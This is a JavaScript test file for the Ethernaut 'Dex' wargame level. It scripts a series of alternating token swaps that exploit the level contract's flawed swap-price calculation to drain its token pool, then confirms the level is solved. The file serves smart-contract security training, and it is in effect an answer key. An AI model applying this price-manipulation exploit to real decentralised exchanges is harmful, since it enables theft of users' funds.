const Ethernaut = artifacts.require('./Ethernaut.sol')
const DexFactory = artifacts.require('./levels/DexFactory.sol')
const SwappableToken = artifacts.require('SwappableToken')
const Dex = artifacts.require('./levels/Dex.sol')
const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')


contract('Dex', function (accounts) {
    let ethernaut
    let level
    let owner = accounts[1]
    let player = accounts[0]
    let player_balance_1
    let player_balance_2
    console.log(`Owner is ${owner}`)
    console.log(`player is ${player}`)

    before(async function () {
        ethernaut = await Ethernaut.new()
        level = await DexFactory.new()
        await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function () {
        const instance = await utils.createLevelInstance(ethernaut, level.address, player, Dex)
        // Check init balances
        let token_one_address = await instance.token1()
        let token_two_address = await instance.token2()
        const token1 = new SwappableToken(token_one_address)
        const token2 = new SwappableToken(token_two_address)
        let token_one_balance = await token1.balanceOf(instance.address)
        let token_two_balance = await token2.balanceOf(instance.address)
        console.log(`init token balances are: ${token_one_balance} for token1 and ${token_two_balance} for token2`)
        player_balance_1 = await token1.balanceOf(player)
        player_balance_2 = await token2.balanceOf(player)
        console.log(`Balances of player are ${player_balance_1}, ${player_balance_2}`)
        assert.equal(token_one_balance, 100)
        assert.equal(token_two_balance, 100)

        // Start swapping
        await token1.approve(instance.address, 200, { from: player })
        await token2.approve(instance.address, 200, { from: player })
        await instance.swap(token1.address, token2.address, 10, { from: player })
        token_one_balance = await token1.balanceOf(instance.address)
        token_two_balance = await token2.balanceOf(instance.address)
        console.log(`new token balances are: ${token_one_balance} for token1 and ${token_two_balance} for token2 after first swap`)
        player_balance_1 = await token1.balanceOf(player)
        player_balance_2 = await token2.balanceOf(player)
        console.log(`Balances of player are ${player_balance_1}, ${player_balance_2}`)
        await instance.swap(token2.address, token1.address, 20, { from: player })
        await instance.swap(token1.address, token2.address, 24, { from: player })
        await instance.swap(token2.address, token1.address, 30, { from: player })
        await instance.swap(token1.address, token2.address, 41, { from: player })
        await instance.swap(token2.address, token1.address, 45, { from: player })
        token_one_balance = await token1.balanceOf(instance.address)
        token_two_balance = await token2.balanceOf(instance.address)
        console.log(`new token balances are: ${token_one_balance} for token1 and ${token_two_balance} for token2`)
        player_balance_1 = await token1.balanceOf(player)
        player_balance_2 = await token2.balanceOf(player)
        console.log(`Balances of player are ${player_balance_1}, ${player_balance_2}`)

        // Check win.
        const ethCompleted = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        )
        assert.equal(ethCompleted, true)
    })

})
